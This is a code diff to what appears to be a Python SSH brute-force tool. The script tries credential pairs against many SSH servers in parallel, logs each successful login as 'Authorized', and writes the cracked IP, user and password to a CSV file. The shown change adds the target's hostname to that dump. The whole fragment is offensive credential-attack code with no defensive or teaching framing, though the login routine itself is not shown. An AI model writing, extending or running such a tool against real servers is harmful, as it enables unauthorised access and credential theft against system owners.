@@ -56,7 +56,7 @@ def brute_force(process_index, ssh_servers, port, credentials):
             while status[0] != True and status[0] != False:
                 status = login(ssh_server, port, credential[0], credential[1])
                 if status[0] == True:
-                    successful_logins.append([ssh_server, credential])
+                    successful_logins.append([ssh_server, credential, status[1]])
                     with lock:
                         display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Fore.LIGHTBLUE_EX}{ssh_server}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
                 elif status[0] == False:
@@ -162,6 +162,6 @@ if __name__ == "__main__":
     display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
     display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
     with open(arguments.write, 'w') as file:
-        file.write(f"IP,User,Password\n")
-        file.write('\n'.join(f"{ip},{username},{password}" for ip, (username, password) in successful_logins))
+        file.write(f"IP,Hostname,User,Password\n")
+        file.write('\n'.join(f"{ip},{hostname},{username},{password}" for ip, (username, password), hostname in successful_logins))
     display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
